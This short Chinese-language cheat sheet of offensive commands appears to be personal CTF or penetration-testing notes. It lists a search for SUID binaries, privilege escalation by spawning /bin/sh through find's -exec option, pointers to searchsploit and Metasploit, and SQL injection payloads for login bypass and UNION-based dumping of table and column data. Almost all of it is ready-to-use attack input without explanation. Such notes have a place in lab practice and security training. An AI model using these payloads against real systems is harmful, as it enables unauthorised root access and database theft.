### `find` 提权

```
find / -perm -u=s -type f 2>/dev/null


1. find ./ acce -exec '/bin/sh' \;

2. touch bcce
find bcce -exec '/bin/sh' \;
```

### `searchsploit`

```
msfconsole
searchsploit
/usr/share/exploitdb
```

### `SQL` 注入

```
username=a' or 1 #
a' or 1 union select 1,group_concat(flag),3 from flag#            

table_schema=database();                           


admin' or '1'='1' 
union select 1,group_concat(column_name),3 
from information_schema.columns 
where table_name='flag'#
```

